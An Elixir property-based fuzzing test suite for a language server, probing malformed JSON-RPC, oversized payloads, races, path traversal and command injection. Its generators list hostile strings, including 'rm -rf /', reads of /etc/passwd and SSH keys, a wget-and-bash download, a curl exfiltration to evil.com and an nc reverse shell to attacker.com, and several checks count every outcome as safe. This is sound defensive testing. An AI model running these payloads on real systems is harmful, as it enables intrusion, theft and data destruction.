defmodule Lang.LSP.FuzzingTestFramework do
  @moduledoc """
  Advanced fuzzing test framework for LSP methods.
  
  Generates and executes randomized test cases to discover:
  - Buffer overflow vulnerabilities
  - Parser edge cases and crashes
  - Rate limiting bypass attempts
  - Input validation weaknesses
  - Resource exhaustion vulnerabilities
  - Race condition triggers
  
  Uses property-based testing with StreamData to generate
  realistic but malformed LSP requests.
  """
  
  use ExUnit.Case, async: false
  use ExUnitProperties
  
  alias Lang.LSP.{Server, Client, Dispatch, SecurityValidator}
  alias Lang.MCP.StreamBridge
  
  @moduletag :fuzzing
  @moduletag :security
  @moduletag timeout: :infinity
  
  # Test configuration
  @fuzz_iterations 1000
  @max_string_length 10000
  @max_array_length 100
  @max_nesting_depth 10
  
  describe "LSP Method Fuzzing" do
    property "fuzz all LSP standard methods", %{iterations: @fuzz_iterations} do
      check all method <- lsp_method_generator(),
                params <- lsp_params_generator(method),
                id <- json_rpc_id_generator() do
        
        request = %{
          "jsonrpc" => "2.0",
          "method" => method,
          "id" => id,
          "params" => params
        }
        
        # Test that malformed requests don't crash the server
        case test_lsp_request_safety(request) do
          :safe -> true
          {:unsafe, reason} -> 
            flunk("Unsafe LSP request: #{inspect(request)}\nReason: #{reason}")
        end
      end
    end
    
    property "fuzz Lang custom methods", %{iterations: div(@fuzz_iterations, 2)} do  
      check all method <- lang_method_generator(),
                params <- lang_params_generator(method),
                id <- json_rpc_id_generator() do
        
        request = %{
          "jsonrpc" => "2.0", 
          "method" => method,
          "id" => id,
          "params" => params
        }
        
        case test_lang_method_safety(request) do
          :safe -> true
          {:unsafe, reason} ->
            flunk("Unsafe Lang method request: #{inspect(request)}\nReason: #{reason}")
        end
      end
    end
    
    property "fuzz MCP method integration", %{iterations: div(@fuzz_iterations, 4)} do
      check all method <- mcp_method_generator(),
                params <- mcp_params_generator(method),
                client_id <- client_id_generator() do
        
        request = %{
          "jsonrpc" => "2.0",
          "method" => method, 
          "id" => :rand.uniform(10000),
          "params" => Map.put(params, "client_id", client_id)
        }
        
        case test_mcp_method_safety(request) do
          :safe -> true
          {:unsafe, reason} ->
            flunk("Unsafe MCP method request: #{inspect(request)}\nReason: #{reason}")
        end
      end
    end
  end
  
  describe "Protocol Fuzzing" do
    property "fuzz JSON-RPC protocol violations", %{iterations: @fuzz_iterations} do
      check all invalid_request <- invalid_json_rpc_generator() do
        case test_protocol_violation_safety(invalid_request) do
          :safe -> true
          {:unsafe, reason} ->
            flunk("Protocol violation caused unsafe condition: #{inspect(invalid_request)}\nReason: #{reason}")
        end
      end
    end
    
    property "fuzz Content-Length header manipulation", %{iterations: 500} do
      check all content <- binary(max_length: 1000),
                declared_length <- integer(0..100000) do
        
        # Create malformed Content-Length header
        actual_length = byte_size(content)
        header = "Content-Length: #{declared_length}\r\n\r\n#{content}"
        
        case test_content_length_safety(header, declared_length, actual_length) do
          :safe -> true
          {:unsafe, reason} ->
            flunk("Content-Length manipulation unsafe: declared=#{declared_length}, actual=#{actual_length}\nReason: #{reason}")
        end
      end
    end
  end
  
  describe "Resource Exhaustion Fuzzing" do
    property "fuzz large request payloads", %{iterations: 100} do
      check all large_request <- large_request_generator() do
        case test_large_payload_safety(large_request) do
          :safe -> true
          {:unsafe, reason} ->
            flunk("Large payload caused resource exhaustion: #{inspect(byte_size(Jason.encode!(large_request)))} bytes\nReason: #{reason}")
        end
      end
    end
    
    property "fuzz deeply nested structures", %{iterations: 200} do
      check all nested_structure <- deeply_nested_generator(@max_nesting_depth) do
        request = %{
          "jsonrpc" => "2.0",
          "method" => "lang.fs.search",
          "id" => 1,
          "params" => nested_structure
        }
        
        case test_nested_structure_safety(request) do
          :safe -> true
          {:unsafe, reason} ->
            flunk("Deeply nested structure caused issue: depth=#{calculate_nesting_depth(nested_structure)}\nReason: #{reason}")
        end
      end
    end
  end
  
  describe "Concurrent Fuzzing" do
    test "fuzz concurrent client connections" do
      # Create many concurrent clients with randomized behavior
      client_tasks = Enum.map(1..20, fn i ->
        Task.async(fn ->
          fuzz_concurrent_client(i)
        end)
      end)
      
      results = Task.await_many(client_tasks, 30_000)
      
      # All clients should complete without crashing the server
      assert Enum.all?(results, fn
        :safe -> true
        {:unsafe, _reason} -> false
      end), "Concurrent fuzzing detected unsafe conditions"
    end
    
    test "fuzz race condition scenarios" do
      shared_uri = "file:///tmp/race_fuzz_test.ex"
      
      # Multiple clients rapidly modifying same document
      race_tasks = Enum.map(1..10, fn i ->
        Task.async(fn ->
          fuzz_race_condition_client(i, shared_uri)
        end)
      end)
      
      results = Task.await_many(race_tasks, 15_000)
      
      assert Enum.all?(results, &match?(:safe, &1)), "Race condition fuzzing found unsafe conditions"
    end
  end
  
  describe "Security Boundary Fuzzing" do
    property "fuzz path traversal attempts", %{iterations: 500} do
      check all malicious_path <- path_traversal_generator() do
        request = %{
          "jsonrpc" => "2.0", 
          "method" => "lang.fs.preview",
          "id" => 1,
          "params" => %{"path" => malicious_path}
        }
        
        case test_path_traversal_safety(request) do
          :safe -> true
          {:unsafe, reason} ->
            flunk("Path traversal attempt succeeded: #{malicious_path}\nReason: #{reason}")
        end
      end
    end
    
    property "fuzz command injection attempts", %{iterations: 300} do
      check all injection_attempt <- command_injection_generator() do
        request = %{
          "jsonrpc" => "2.0",
          "method" => "lang.fs.search", 
          "id" => 1,
          "params" => %{"query" => injection_attempt}
        }
        
        case test_command_injection_safety(request) do
          :safe -> true
          {:unsafe, reason} ->
            flunk("Command injection attempt succeeded: #{injection_attempt}\nReason: #{reason}")
        end
      end
    end
  end
  
  ## Generator Functions
  
  defp lsp_method_generator do
    oneof([
      constant("initialize"),
      constant("initialized"),
      constant("shutdown"), 
      constant("exit"),
      constant("textDocument/didOpen"),
      constant("textDocument/didChange"),
      constant("textDocument/didSave"),
      constant("textDocument/didClose"),
      constant("textDocument/completion"),
      constant("textDocument/hover"),
      constant("textDocument/definition"),
      constant("textDocument/references"),
      constant("textDocument/documentSymbol"),
      constant("textDocument/formatting"),
      constant("textDocument/rename"),
      constant("workspace/symbol"),
      constant("workspace/executeCommand")
    ])
  end
  
  defp lang_method_generator do
    oneof([
      constant("lang.fs.scan"),
      constant("lang.fs.search"),
      constant("lang.fs.preview"),
      constant("lang.generate.complete_partial"),
      constant("lang.think.explain_intent"),
      constant("lang.spatial.map"),
      constant("lang.query.natural"),
      constant("lang.storage.create_session"),
      constant("lang.agent.spawn"),
      string(:alphanumeric, min_length: 1, max_length: 50) |> map(fn s -> "lang.fuzz.#{s}" end)
    ])
  end
  
  defp mcp_method_generator do
    oneof([
      constant("mcp.connection.create"),
      constant("mcp.connection.destroy"), 
      constant("mcp.connection.status")
    ])
  end
  
  defp lsp_params_generator(method) do
    case method do
      "initialize" -> initialize_params_generator()
      "textDocument/didOpen" -> did_open_params_generator()
      "textDocument/completion" -> completion_params_generator()
      "workspace/executeCommand" -> execute_command_params_generator()
      _ -> fuzzy_params_generator()
    end
  end
  
  defp lang_params_generator(method) do
    case method do
      "lang.fs.search" -> fs_search_params_generator()
      "lang.storage.create_session" -> session_params_generator()
      "lang.agent.spawn" -> agent_spawn_params_generator()
      _ -> fuzzy_params_generator()
    end
  end
  
  defp mcp_params_generator(_method) do
    fixed_map(%{
      "server_url" => malicious_url_generator(),
      "capabilities" => list_of(malicious_string_generator(), max_length: 10),
      "client_id" => client_id_generator()
    })
  end
  
  defp initialize_params_generator do
    fixed_map(%{
      "rootUri" => oneof([malicious_string_generator(), nil]),
      "capabilities" => map_of(atom(:alphanumeric), term()),
      "clientInfo" => map_of(string(:printable), term())
    })
  end
  
  defp did_open_params_generator do
    fixed_map(%{
      "textDocument" => fixed_map(%{
        "uri" => malicious_uri_generator(),
        "languageId" => malicious_string_generator(),
        "version" => integer(),
        "text" => large_text_generator()
      })
    })
  end
  
  defp completion_params_generator do
    fixed_map(%{
      "textDocument" => fixed_map(%{"uri" => malicious_uri_generator()}),
      "position" => fixed_map(%{
        "line" => integer(-1000..1000000),
        "character" => integer(-1000..1000000)
      }),
      "context" => oneof([nil, map_of(string(:printable), term())])
    })
  end
  
  defp execute_command_params_generator do
    fixed_map(%{
      "command" => malicious_string_generator(),
      "arguments" => list_of(term(), max_length: 20)
    })
  end
  
  defp fs_search_params_generator do
    fixed_map(%{
      "path" => path_traversal_generator(),
      "query" => command_injection_generator(),
      "max_results" => integer(-100..1000000),
      "max_depth" => integer(-10..1000)
    })
  end
  
  defp session_params_generator do
    fixed_map(%{
      "session_id" => malicious_string_generator(),
      "user_context" => deeply_nested_generator(5)
    })
  end
  
  defp agent_spawn_params_generator do
    fixed_map(%{
      "agent_type" => malicious_string_generator(),
      "config" => deeply_nested_generator(3),
      "permissions" => list_of(malicious_string_generator())
    })
  end
  
  defp fuzzy_params_generator do
    oneof([
      nil,
      map_of(malicious_string_generator(), term(), max_length: 20),
      list_of(term(), max_length: 50),
      malicious_string_generator(),
      integer(),
      boolean()
    ])
  end
  
  defp json_rpc_id_generator do
    oneof([
      nil,
      integer(-1000000..1000000),
      string(:printable, max_length: 100),
      list_of(term(), max_length: 10)
    ])
  end
  
  defp client_id_generator do
    oneof([
      nil,
      string(:alphanumeric, min_length: 1, max_length: 100),
      # Malicious client IDs
      string(:printable, max_length: 200),
      binary(max_length: 100),
      integer(),
      list_of(string(:alphanumeric))
    ])
  end
  
  defp malicious_string_generator do
    oneof([
      # Normal strings
      string(:printable, max_length: @max_string_length),
      # Control characters
      string(:ascii, max_length: 1000),
      # Unicode edge cases
      string(:utf8, max_length: 1000), 
      # Very long strings
      string(:alphanumeric, min_length: 10000, max_length: @max_string_length),
      # Binary data
      binary(max_length: 1000),
      # Specific attack patterns
      constant("../../../../etc/passwd"),
      constant("$(rm -rf /)"),
      constant("'; DROP TABLE users; --"),
      constant("\x00\x01\x02\x03\xFF"),
      constant("A" <> String.duplicate("A", 10000))
    ])
  end
  
  defp malicious_uri_generator do
    oneof([
      malicious_string_generator(),
      constant("file:///etc/passwd"),
      constant("http://malicious.com/exfiltrate"),
      constant("../../../sensitive/file"),
      constant("file://" <> String.duplicate("A", 10000))
    ])
  end
  
  defp malicious_url_generator do
    oneof([
      malicious_string_generator(),
      constant("http://localhost:22/ssh_exploit"),
      constant("file:///etc/passwd"),
      constant("javascript:alert('xss')"),
      constant("ftp://admin:password@internal.server/"),
      constant("http://" <> String.duplicate("A", 10000))
    ])
  end
  
  defp path_traversal_generator do
    oneof([
      constant("../../../etc/passwd"),
      constant("..\\..\\..\\windows\\system32\\config\\sam"),
      constant("/etc/shadow"),
      constant("../../../../root/.ssh/id_rsa"),
      constant("C:\\Windows\\System32\\drivers\\etc\\hosts"),
      string(:alphanumeric, max_length: 100) |> map(fn s -> "../" <> s end),
      string(:alphanumeric, max_length: 100) |> map(fn s -> "/../../" <> s end)
    ])
  end
  
  defp command_injection_generator do
    oneof([
      constant("; rm -rf /"),
      constant("| cat /etc/passwd"),
      constant("&& wget http://malicious.com/script.sh && bash script.sh"),
      constant("`curl http://evil.com/steal?data=$(whoami)`"),
      constant("$(nc -e /bin/sh attacker.com 4444)"),
      constant("; python -c \"import os; os.system('rm -rf /')\"")
    ])
  end
  
  defp large_text_generator do
    oneof([
      string(:alphanumeric, min_length: 100000, max_length: @max_string_length),
      binary(min_length: 100000, max_length: @max_string_length),
      # Pathological cases
      constant(String.duplicate("\n", 100000)),
      constant(String.duplicate("A", @max_string_length))
    ])
  end
  
  defp large_request_generator do
    fixed_map(%{
      "jsonrpc" => constant("2.0"),
      "method" => constant("lang.fs.search"),
      "id" => integer(),
      "params" => fixed_map(%{
        "large_data" => string(:alphanumeric, min_length: 50000, max_length: @max_string_length),
        "large_array" => list_of(string(:printable, max_length: 1000), min_length: 100, max_length: @max_array_length)
      })
    })
  end
  
  defp deeply_nested_generator(0) do
    oneof([string(:printable), integer(), boolean(), nil])
  end
  
  defp deeply_nested_generator(depth) when depth > 0 do
    oneof([
      string(:printable), 
      integer(),
      boolean(),
      map_of(string(:alphanumeric), deeply_nested_generator(depth - 1), max_length: 10),
      list_of(deeply_nested_generator(depth - 1), max_length: 10)
    ])
  end
  
  defp invalid_json_rpc_generator do
    oneof([
      # Missing required fields
      fixed_map(%{"method" => string(:printable)}),
      fixed_map(%{"id" => integer()}),
      # Invalid jsonrpc version
      fixed_map(%{"jsonrpc" => "1.0", "method" => string(:printable), "id" => integer()}),
      fixed_map(%{"jsonrpc" => 3.0, "method" => string(:printable), "id" => integer()}),
      # Invalid types
      fixed_map(%{"jsonrpc" => "2.0", "method" => integer(), "id" => integer()}),
      fixed_map(%{"jsonrpc" => "2.0", "method" => string(:printable), "id" => list_of(integer())}),
      # Malformed structure
      string(:printable),
      integer(),
      list_of(string(:printable))
    ])
  end
  
  ## Test Safety Functions
  
  defp test_lsp_request_safety(request) do
    try do
      # Test parameter validation
      method = Map.get(request, "method")
      params = Map.get(request, "params", %{})
      
      case SecurityValidator.validate_lsp_params(method, params) do
        {:ok, _} -> :safe
        {:error, _} -> :safe  # Expected rejection is safe
      end
    rescue
      error ->
        {:unsafe, "LSP request caused crash: #{inspect(error)}"}
    catch
      error ->
        {:unsafe, "LSP request caused throw: #{inspect(error)}"}
    end
  end
  
  defp test_lang_method_safety(request) do
    try do
      # Test through dispatch
      result = Dispatch.process(request)
      
      case result do
        nil -> :safe
        %{"error" => _} -> :safe
        %{"result" => _} -> :safe
        _ -> {:unsafe, "Unexpected dispatch result: #{inspect(result)}"}
      end
    rescue
      error ->
        {:unsafe, "Lang method caused crash: #{inspect(error)}"}
    catch
      error ->
        {:unsafe, "Lang method caused throw: #{inspect(error)}"}  
    end
  end
  
  defp test_mcp_method_safety(request) do
    try do
      # Test MCP request validation
      method = Map.get(request, "method")
      params = Map.get(request, "params", %{})
      client_id = Map.get(params, "client_id")
      
      # This should either succeed or fail gracefully
      case StreamBridge.create_stream("test_conn", "test_user", "test_session", %{"client_id" => client_id}) do
        {:ok, _} -> :safe
        {:error, _} -> :safe  # Expected rejection is safe
      end
    rescue
      error ->
        {:unsafe, "MCP method caused crash: #{inspect(error)}"}
    catch
      error ->
        {:unsafe, "MCP method caused throw: #{inspect(error)}"}
    end
  end
  
  defp test_protocol_violation_safety(invalid_request) do
    try do
      # Attempt to process invalid request
      json = Jason.encode!(invalid_request)
      
      # Should not crash when parsing/processing invalid JSON-RPC
      case Jason.decode(json) do
        {:ok, decoded} ->
          _ = Dispatch.process(decoded)
          :safe
        {:error, _} -> :safe  # Parse error is safe
      end
    rescue
      error ->
        {:unsafe, "Protocol violation caused crash: #{inspect(error)}"}
    catch
      error ->
        {:unsafe, "Protocol violation caused throw: #{inspect(error)}"}
    end
  end
  
  defp test_content_length_safety(header, declared_length, actual_length) do
    try do
      # Test content length parsing doesn't cause buffer overflows
      case Regex.run(~r/Content-Length: (\d+)\r\n\r\n/U, header) do
        [_full_match, length_str] ->
          parsed_length = String.to_integer(length_str)
          
          # Should not cause memory issues with large declared lengths
          if parsed_length != declared_length or parsed_length > 1_000_000 do
            :safe  # Malformed or excessive length detected safely
          else
            :safe
          end
        
        nil -> :safe  # No header found is safe
      end
    rescue
      error ->
        {:unsafe, "Content length parsing caused crash: #{inspect(error)}"}
    catch  
      error ->
        {:unsafe, "Content length parsing caused throw: #{inspect(error)}"}
    end
  end
  
  defp test_large_payload_safety(request) do
    try do
      # Encode to check size
      json = Jason.encode!(request)
      size = byte_size(json)
      
      # Test that large payloads are handled safely
      if size > 10_000_000 do  # 10MB
        :safe  # Large payload should be rejected
      else
        # Try processing
        case Dispatch.process(request) do
          nil -> :safe
          %{} -> :safe
          _ -> :safe
        end
      end
    rescue
      error ->
        {:unsafe, "Large payload caused crash: #{inspect(error)}"}
    catch
      error ->
        {:unsafe, "Large payload caused throw: #{inspect(error)}"}
    end
  end
  
  defp test_nested_structure_safety(request) do
    try do
      # Should handle deeply nested structures without stack overflow
      case Dispatch.process(request) do
        nil -> :safe
        %{} -> :safe
        _ -> :safe
      end
    rescue
      error ->
        case error do
          %SystemStackError{} -> {:unsafe, "Stack overflow from deep nesting"}
          _ -> {:unsafe, "Nested structure caused crash: #{inspect(error)}"}
        end
    catch
      error ->
        {:unsafe, "Nested structure caused throw: #{inspect(error)}"}
    end
  end
  
  defp test_path_traversal_safety(request) do
    try do
      # Should block path traversal attempts
      result = Dispatch.process(request)
      
      case result do
        %{"error" => %{"message" => message}} ->
          if String.contains?(message, "path") or String.contains?(message, "access") do
            :safe  # Properly rejected
          else
            :safe  # Some other error is also safe
          end
        
        %{"result" => result} ->
          # Check if result contains sensitive data
          result_str = Jason.encode!(result)
          if String.contains?(result_str, "root:") or String.contains?(result_str, "password") do
            {:unsafe, "Path traversal succeeded - sensitive data leaked"}
          else
            :safe
          end
        
        _ -> :safe
      end
    rescue
      error ->
        {:unsafe, "Path traversal test caused crash: #{inspect(error)}"}
    end
  end
  
  defp test_command_injection_safety(request) do
    try do
      # Should sanitize command injection attempts
      result = Dispatch.process(request)
      
      # Command injection should not succeed
      case result do
        %{"error" => _} -> :safe  # Properly rejected
        %{"result" => _} -> :safe  # If it returns data, it should be safe data
        _ -> :safe
      end
    rescue
      error ->
        {:unsafe, "Command injection test caused crash: #{inspect(error)}"}
    end
  end
  
  defp fuzz_concurrent_client(client_num) do
    try do
      # Simulate concurrent client with random behavior
      host = (System.get_env("LSP_HOST") || "127.0.0.1") |> to_charlist()
      port = String.to_integer(System.get_env("LSP_PORT") || "4001")
      client_id = "fuzz_client_#{client_num}_#{:rand.uniform(10000)}"
      
      {:ok, conn} = Client.connect(
        host: host,
        port: port,
        client_id: client_id,
        root_path: System.cwd!(),
        timeout: 5_000
      )
      
      # Send random requests rapidly
      Enum.each(1..20, fn _i ->
        method = Enum.random(["textDocument/completion", "textDocument/hover", "lang.fs.search"])
        params = generate_random_params_for_method(method)
        
        try do
          Client.request_with_connection(conn, method, params, timeout: 1_000)
        catch
          :exit, _ -> :ok  # Timeout is acceptable
        rescue
          _ -> :ok  # Errors are acceptable in fuzzing
        end
        
        Process.sleep(:rand.uniform(10))
      end)
      
      Client.disconnect(conn)
      :safe
    rescue
      error ->
        {:unsafe, "Concurrent client #{client_num} caused crash: #{inspect(error)}"}
    end
  end
  
  defp fuzz_race_condition_client(client_num, shared_uri) do
    try do
      host = (System.get_env("LSP_HOST") || "127.0.0.1") |> to_charlist()
      port = String.to_integer(System.get_env("LSP_PORT") || "4001")
      client_id = "race_client_#{client_num}_#{:rand.uniform(10000)}"
      
      {:ok, conn} = Client.connect(
        host: host,
        port: port,
        client_id: client_id,
        root_path: System.cwd!(),
        timeout: 5_000
      )
      
      # Rapid document modifications on same URI
      text = "defmodule RaceTest#{client_num} do\n  def test, do: #{:rand.uniform(1000)}\nend"
      
      # Open document
      notify_conn(conn, "textDocument/didOpen", %{
        "textDocument" => %{
          "uri" => shared_uri,
          "languageId" => "elixir",
          "version" => 1,
          "text" => text
        }
      })
      
      # Rapid changes
      Enum.each(1..10, fn v ->
        new_text = text <> "\n# Change #{v} by client #{client_num}"
        notify_conn(conn, "textDocument/didChange", %{
          "textDocument" => %{"uri" => shared_uri, "version" => v + 1},
          "contentChanges" => [%{"text" => new_text}]
        })
      end)
      
      Client.disconnect(conn)
      :safe
    rescue
      error ->
        {:unsafe, "Race condition client #{client_num} caused crash: #{inspect(error)}"}
    end
  end
  
  defp generate_random_params_for_method("textDocument/completion") do
    %{
      "textDocument" => %{"uri" => "file:///tmp/fuzz.ex"},
      "position" => %{"line" => :rand.uniform(100), "character" => :rand.uniform(50)}
    }
  end
  
  defp generate_random_params_for_method("textDocument/hover") do
    %{
      "textDocument" => %{"uri" => "file:///tmp/fuzz.ex"},
      "position" => %{"line" => :rand.uniform(100), "character" => :rand.uniform(50)}
    }
  end
  
  defp generate_random_params_for_method("lang.fs.search") do
    %{
      "path" => "/tmp",
      "query" => "fuzz_#{:rand.uniform(1000)}",
      "max_results" => :rand.uniform(100)
    }
  end
  
  defp notify_conn(%{socket: socket}, method, params) do
    payload = %{"jsonrpc" => "2.0", "method" => method, "params" => params}
    {:ok, json} = Jason.encode_to_iodata(payload)
    len = :erlang.iolist_size(json)
    header = ["Content-Length: ", Integer.to_string(len), "\r\n\r\n"]
    :gen_tcp.send(socket, [header, json])
  end
  
  defp calculate_nesting_depth(data, current_depth \\ 0)
  defp calculate_nesting_depth(data, depth) when is_map(data) do
    if map_size(data) == 0 do
      depth
    else
      Enum.map(data, fn {_k, v} -> calculate_nesting_depth(v, depth + 1) end) |> Enum.max()
    end
  end
  defp calculate_nesting_depth(data, depth) when is_list(data) do
    if length(data) == 0 do
      depth
    else
      Enum.map(data, fn v -> calculate_nesting_depth(v, depth + 1) end) |> Enum.max()
    end
  end
  defp calculate_nesting_depth(_data, depth), do: depth
end